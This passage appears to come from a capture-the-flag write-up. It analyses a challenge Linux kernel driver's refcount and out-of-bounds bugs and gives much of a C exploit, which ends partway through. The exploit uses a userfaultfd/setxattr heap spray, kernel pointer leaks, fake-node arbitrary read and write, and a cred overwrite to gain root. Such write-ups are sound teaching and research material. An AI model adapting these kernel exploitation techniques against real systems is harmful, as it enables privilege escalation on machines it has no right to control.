and creates the edges A->B and B->A;</li><li>Info (<code>0x8018d901</code>): provides information about the node;</li><li>Finalize (<code>0xd902</code>): finalizes the graph rooted in the node, preparing it for
queries;</li><li>Query (<code>0xc010d903</code>): takes two node descriptors and calculates the total
weight of the shortest path between them.</li></ul><p>When we create an edge (nodes can be linked only if not finalized), the
following structure is allocated:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>edge</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>edge</span> <span class=o>*</span><span class=n>next</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>edge</span> <span class=o>*</span><span class=n>prev</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>node</span> <span class=o>*</span><span class=n>node</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>weight</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p>Where <code>next</code> and <code>prev</code> make up a <code>list_head</code>.
The edge is then inserted in the <code>struct node</code>&rsquo;s <code>edges</code> list.</p><p>When we finalize a node, the driver performs a depth-first traversal of the
graph rooted in the node.
The list of nodes in DFS order is stored in the <code>traversal</code> list of the node.
The index of each node in the DFS list is stored in that node&rsquo;s <code>traversal_idx</code>.</p><p>The <code>traversal</code> list is a simple vector:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>node_list</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>capacity</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>node</span> <span class=o>*</span><span class=n>nodes</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p>The query ioctl, which requires a finalized source node, allocates an array of
distances of length equal to the source&rsquo;s <code>traversal</code> list length. Then, it uses
this working array to compute shortest-path distances until it gets to the
shortest-path distance of the destination node, at which point it can return the
answer.</p><p>There are a couple bugs.</p><p>Finalizing a node will (correctly) increment the refcount of all nodes in the
DFS traversal. However, linking two nodes will not increment their refcount.
Therefore, if two nodes are linked and then one is <code>close</code>d, the surviving one
will have an <code>edge</code> whose <code>node</code> field points to the other node&rsquo;s freed <code>struct node</code>, i.e., a dangling pointer (which we could turn into UAF).</p><p>Moreover, the <code>traversal_idx</code> is a property of the node, rather than of the
traversal. This is only correct if a node can be in at most a single traversal,
which is ensured by the finalization logic, which will mark every node in the
DFS as finalized and stop when it encounters an already-finalized node. However,
the query logic also uses a node&rsquo;s children, not just the pre-calculated DFS
traversal, when updating distances iteratively:</p><pre tabindex=0><code>for every edge E in the current node&#39;s edges:
    if distance[E-&gt;node-&gt;traversal_idx] != -1:
        new_dist = current_path_distance + E-&gt;weight
        if new_dist &lt; distance[E-&gt;node-&gt;traversal_idx]:
            distance[E-&gt;node-&gt;traversal_idx] = new_dist
</code></pre><p>It&rsquo;s possible to create a situation where a node has children in different
traversals. For example, if A has children B and C, then by finalizing C and
then A we&rsquo;d get two traversals <code>[C]</code> and <code>[A, B]</code>, so B and C are in different
traversals. However, that query code assumes that children are always in the
same traversal, because the <code>traversal_idx</code> is not checked in any way. By
exploiting this, we can get a OOB write from the distance array.</p><p>Our exploit is needlessly complex, but we blame sleep deprivation :)</p><p>We use the first bug (edge with dangling ptr) to cause a crash during a query.
We reclaim the freed node using the
<a href=https://duasynt.com/blog/linux-kernel-heap-spray target=_blank>setxattr+userfaultfd technique</a>
and we fake a node with a huge <code>traversal_idx</code> (resulting in a non-canonical
access) to crash the query. This will not crash the kernel, but will print a
panic to dmesg, which we can read, and leak a couple pointers: a node pointer,
and the location of the distance array of the crashing query. Note that the
array is freed after the query, but since the query crashed, it&rsquo;s still
allocated.</p><p>Then, we shape the heap so that a query will allocate the distance array right
before a node. We use the OOB in query to modify the node&rsquo;s refcount. Then, we
are able to free the node while still retaining a file descriptor to it. By
reclaiming the freed node, we now have a primitive that gives us full control of
a node structure that&rsquo;s backing a live file descriptor. This is properly
engineered to that we can repeatedly free and reclaim the node as many times as
we want, so that we can change the structure contents at will.</p><p>We exploit the controlled node primitive to build an arbitrary read primitive.
The info ioctl, along other values, also outputs us the <code>size</code> of the node&rsquo;s
<code>traversal</code>. Since we control the <code>traversal</code> field, this allows us to read a
8-byte integer from an arbitrary address (repeatedly). We use the read, coupled
with the pointers we leaked earlier, to scan the heap and find our fake node (we
put a unique marker as id). Then, since during the info ioctl the <code>state_lock</code>
lock is held, we can read <code>current</code> from the mutex, and our task&rsquo;s <code>cred</code>
pointer from that.</p><p>We then abuse cleanup logic on a fake node to free the leaked distance array
that was still allocated, so that the next (properly sized) query will reclaim
it and thus put its distance array at the same known address.
Querying a fake node also gives us control over <code>traversal_idx</code>, and so now the
query OOB can be turned into an arbitrary write.</p><p>We use the write to overwrite our task&rsquo;s UID in its <code>cred</code> to 0.
Then, we can simply open the root-owned <code>/flag</code> and read it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define _GNU_SOURCE
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;assert.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/ioctl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;pthread.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;syscall.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;linux/userfaultfd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;poll.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/xattr.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;errno.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;signal.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/klog.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdbool.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;semaphore.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define DEV_PATH &#34;/dev/node&#34;
</span></span></span><span class=line><span class=cl><span class=cp>#define SPARK_FINALIZE 0xd902
</span></span></span><span class=line><span class=cl><span class=cp>#define SPARK_LINK 0x4008d900
</span></span></span><span class=line><span class=cl><span class=cp>#define SPARK_QUERY 0xc010d903
</span></span></span><span class=line><span class=cl><span class=cp>#define SPARK_INFO 0x8018D901
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>spark_ioctl_query</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>fd1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>fd2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>long</span> <span class=kt>long</span> <span class=n>distance</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>spark_info</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>num_children</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>traversal_idx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>traversal_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>unsigned</span> <span class=n>g_create_next_id</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=nf>create</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>DEV_PATH</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=n>fd</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>g_create_next_id</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>llink</span><span class=p>(</span><span class=kt>int</span> <span class=n>a</span><span class=p>,</span> <span class=kt>int</span> <span class=n>b</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>weight</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=nf>ioctl</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>SPARK_LINK</span><span class=p>,</span> <span class=n>b</span> <span class=o>|</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span><span class=p>)</span> <span class=n>weight</span> <span class=o>&lt;&lt;</span> <span class=mi>32</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>long</span> <span class=kt>long</span> <span class=nf>query</span><span class=p>(</span><span class=kt>int</span> <span class=n>a</span><span class=p>,</span> <span class=kt>int</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>spark_ioctl_query</span> <span class=n>qry</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=p>.</span><span class=n>fd1</span> <span class=o>=</span> <span class=n>a</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=p>.</span><span class=n>fd2</span> <span class=o>=</span> <span class=n>b</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=p>};</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=nf>ioctl</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>SPARK_QUERY</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>qry</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>qry</span><span class=p>.</span><span class=n>distance</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>finalize</span><span class=p>(</span><span class=kt>int</span> <span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=nf>ioctl</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>SPARK_FINALIZE</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>get_info</span><span class=p>(</span><span class=kt>int</span> <span class=n>a</span><span class=p>,</span> <span class=k>struct</span> <span class=n>spark_info</span> <span class=o>*</span><span class=n>info</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=nf>ioctl</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>SPARK_INFO</span><span class=p>,</span> <span class=n>info</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>release</span><span class=p>(</span><span class=kt>int</span> <span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=nf>close</span><span class=p>(</span><span class=n>a</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>fault_arg</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>sem_t</span> <span class=n>fault_sema</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>sem_t</span> <span class=n>unblock_sema</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span> <span class=o>*</span><span class=n>addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=o>*</span><span class=nf>fault_thread</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>arg</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>fault_arg</span> <span class=o>*</span><span class=n>param</span> <span class=o>=</span> <span class=p>(</span><span class=k>struct</span> <span class=n>fault_arg</span> <span class=o>*</span><span class=p>)</span><span class=n>arg</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=n>page</span> <span class=o>=</span> <span class=nf>mmap</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>,</span> <span class=n>PROT_READ</span> <span class=o>|</span> <span class=n>PROT_WRITE</span><span class=p>,</span> <span class=n>MAP_ANONYMOUS</span> <span class=o>|</span> <span class=n>MAP_PRIVATE</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=n>page</span> <span class=o>!=</span> <span class=n>MAP_FAILED</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>page</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0xff</span><span class=p>;</span> <span class=c1>// top byte for traversal addr
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=c1>// create a userfaultfd object
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=kt>int</span> <span class=n>uffd</span> <span class=o>=</span> <span class=nf>syscall</span><span class=p>(</span><span class=n>__NR_userfaultfd</span><span class=p>,</span> <span class=n>O_CLOEXEC</span> <span class=o>|</span> <span class=n>O_NONBLOCK</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=n>uffd</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// enable the userfaultfd object
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>struct</span> <span class=n>uffdio_api</span> <span class=n>uffdio_api</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>uffdio_api</span><span class=p>.</span><span class=n>api</span> <span class=o>=</span> <span class=n>UFFD_API</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>uffdio_api</span><span class=p>.</span><span class=n>features</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=nf>ioctl</span><span class=p>(</span><span class=n>uffd</span><span class=p>,</span> <span class=n>UFFDIO_API</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>uffdio_api</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// n_addr is the start of where you want to catch the pagefault. In our
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// case, we set it to the address of page 2
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>struct</span> <span class=n>uffdio_register</span> <span class=n>uffdio_register</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>uffdio_register</span><span class=p>.</span><span class=n>range</span><span class=p>.</span><span class=n>start</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span><span class=n>param</span><span class=o>-&gt;</span><span class=n>addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>uffdio_register</span><span class=p>.</span><span class=n>range</span><span class=p>.</span><span class=n>len</span> <span class=o>=</span> <span class=mh>0x1000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>uffdio_register</span><span class=p>.</span><span class=n>mode</span> <span class=o>=</span> <span class=n>UFFDIO_REGISTER_MODE_MISSING</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=nf>ioctl</span><span class=p>(</span><span class=n>uffd</span><span class=p>,</span> <span class=n>UFFDIO_REGISTER</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>uffdio_register</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=nf>sem_post</span><span class=p>(</span><span class=o>&amp;</span><span class=n>param</span><span class=o>-&gt;</span><span class=n>fault_sema</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>pollfd</span> <span class=n>pollfd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>nready</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>pollfd</span><span class=p>.</span><span class=n>fd</span> <span class=o>=</span> <span class=n>uffd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>pollfd</span><span class=p>.</span><span class=n>events</span> <span class=o>=</span> <span class=n>POLLIN</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>nready</span> <span class=o>=</span> <span class=nf>poll</span><span class=p>(</span><span class=o>&amp;</span><span class=n>pollfd</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=n>nready</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>uffd_msg</span> <span class=n>msg</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=nf>read</span><span class=p>(</span><span class=n>uffd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>msg</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>msg</span><span class=p>))</span> <span class=o>==</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>msg</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=n>msg</span><span class=p>.</span><span class=n>event</span> <span class=o>==</span> <span class=n>UFFD_EVENT_PAGEFAULT</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=nf>sem_post</span><span class=p>(</span><span class=o>&amp;</span><span class=n>param</span><span class=o>-&gt;</span><span class=n>fault_sema</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=nf>sem_wait</span><span class=p>(</span><span class=o>&amp;</span><span class=n>param</span><span class=o>-&gt;</span><span class=n>unblock_sema</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>uffdio_copy</span> <span class=n>uffdio_copy</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>uffdio_copy</span><span class=p>.</span><span class=n>src</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span> <span class=n>page</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>uffdio_copy</span><span class=p>.</span><span class=n>dst</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span> <span class=n>msg</span><span class=p>.</span><span class=n>arg</span><span class=p>.</span><span class=n>pagefault</span><span class=p>.</span><span class=n>address</span> <span class=o>&amp;</span> <span class=o>~</span><span class=mh>0xfffUL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>uffdio_copy</span><span class=p>.</span><span class=n>len</span> <span class=o>=</span> <span class=mh>0x1000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>uffdio_copy</span><span class=p>.</span><span class=n>mode</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>uffdio_copy</span><span class=p>.</span><span class=n>copy</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=nf>ioctl</span><span class=p>(</span><span class=n>uffd</span><span class=p>,</span> <span class=n>UFFDIO_COPY</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>uffdio_copy</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>close</span><span class=p>(</span><span class=n>uffd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>munmap</span><span class=p>(</span><span class=n>page</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>setxattr_arg</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>const</span> <span class=kt>void</span> <span class=o>*</span><span class=n>buf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>size_t</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=o>*</span><span class=nf>setxattr_thread</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>arg</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>setxattr_arg</span> <span class=o>*</span><span class=n>param</span> <span class=o>=</span> <span class=p>(</span><span class=k>struct</span> <span class=n>setxattr_arg</span> <span class=o>*</span><span class=p>)</span><span class=n>arg</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=nf>setxattr</span><span class=p>(</span><span class=s>&#34;.&#34;</span><span class=p>,</span> <span class=s>&#34;nonexistent&#34;</span><span class=p>,</span> <span class=n>param</span><span class=o>-&gt;</span><span class=n>buf</span><span class=p>,</span> <span class=n>param</span><span class=o>-&gt;</span><span class=n>size</span><span class=p>,</span> <span class=n>XATTR_REPLACE</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>reclaim_ctx</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>fault_arg</span> <span class=n>fault_arg</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>setxattr_arg</span> <span class=n>setxattr_arg</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>pthread_t</span> <span class=n>setxattr_handle</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>reclaim_alloc_raw</span><span class=p>(</span><span class=k>struct</span> <span class=n>reclaim_ctx</span> <span class=o>*</span><span class=n>ctx</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=o>*</span><span class=n>mem</span> <span class=o>=</span> <span class=nf>mmap</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span> <span class=mh>0x2000</span><span class=p>,</span> <span class=n>PROT_READ</span> <span class=o>|</span> <span class=n>PROT_WRITE</span><span class=p>,</span> <span class=n>MAP_ANONYMOUS</span> <span class=o>|</span> <span class=n>MAP_PRIVATE</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=n>mem</span> <span class=o>!=</span> <span class=n>MAP_FAILED</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>ctx</span><span class=o>-&gt;</span><span class=n>fault_arg</span><span class=p>.</span><span class=n>addr</span> <span class=o>=</span> <span class=n>mem</span> <span class=o>+</span> <span class=mh>0x1000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=nf>sem_init</span><span class=p>(</span><span class=o>&amp;</span><span class=n>ctx</span><span class=o>-&gt;</span><span class=n>fault_arg</span><span class=p>.</span><span class=n>fault_sema</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=nf>sem_init</span><span class=p>(</span><span class=o>&amp;</span><span class=n>ctx</span><span class=o>-&gt;</span><span class=n>fault_arg</span><span class=p>.</span><span class=n>unblock_sema</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>pthread_t</span> <span class=n>handle</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=nf>pthread_create</span><span class=p>(</span><span class=o>&amp;</span><span class=n>handle</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>fault_thread</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ctx</span><span class=o>-&gt;</span><span class=n>fault_arg</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
